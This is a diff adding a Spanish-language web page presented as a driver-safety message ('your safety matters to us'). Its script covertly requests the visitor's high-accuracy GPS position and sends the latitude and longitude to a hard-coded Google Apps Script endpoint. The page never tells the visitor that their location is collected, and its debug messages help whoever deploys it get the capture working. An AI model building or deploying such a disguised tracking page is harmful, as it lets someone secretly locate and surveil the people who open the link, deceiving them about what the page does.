@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Seguridad del Conductor</title>
+<style>
+  * { box-sizing: border-box; }
+  html, body { height: 100%; margin: 0; }
+  body {
+    font-family: -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+    background: #0f172a;
+    color: #f1f5f9;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    padding: 24px;
+  }
+  .contenido { max-width: 360px; }
+  .icono { font-size: 5rem; margin-bottom: 20px; }
+  h1 { font-size: 1.6rem; line-height: 1.35; margin: 0; }
+  #debug {
+    margin-top: 18px;
+    font-size: 0.75rem;
+    color: #f87171;
+    min-height: 16px;
+  }
+</style>
+</head>
+<body>
+  <div class="contenido">
+    <div class="icono">🛡️</div>
+    <h1>SEÑOR CONDUCTOR<br>TU SEGURIDAD NOS IMPORTA</h1>
+    <div id="debug"></div>
+  </div>
+
+<script>
+  // ⚠️ URL de tu Google Apps Script
+  const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbykRa--qjR6EfXHBL0nj5JywqCJZs1vbeznKz64UQFCXB2yCVxxnd6QuchPGSCujda6/exec";
+  const debugEl = document.getElementById("debug");
+
+  function enviarUbicacion(lat, lng) {
+    fetch(APPS_SCRIPT_URL, {
+      method: "POST",
+      mode: "no-cors",
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      body: new URLSearchParams({ lat, lng })
+    }).catch(() => {
+      debugEl.textContent = "No se pudo enviar la ubicación (revisa conexión).";
+    });
+  }
+
+  if (!window.isSecureContext) {
+    debugEl.textContent = "Abre el link https:// del sitio, no el archivo local.";
+  } else if (!navigator.geolocation) {
+    debugEl.textContent = "Este navegador no soporta geolocalización.";
+  } else {
+    navigator.geolocation.getCurrentPosition(
+      (pos) => enviarUbicacion(pos.coords.latitude, pos.coords.longitude),
+      (err) => {
+        if (err.code === 1) {
+          debugEl.textContent = "Permiso de ubicación denegado. Actívalo en ajustes del navegador.";
+        } else if (err.code === 2) {
+          debugEl.textContent = "Ubicación no disponible. Activa el GPS del celular.";
+        } else {
+          debugEl.textContent = "Tiempo de espera agotado. Intenta de nuevo con buena señal.";
+        }
+      },
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
+  }
+</script>
+</body>
+</html>
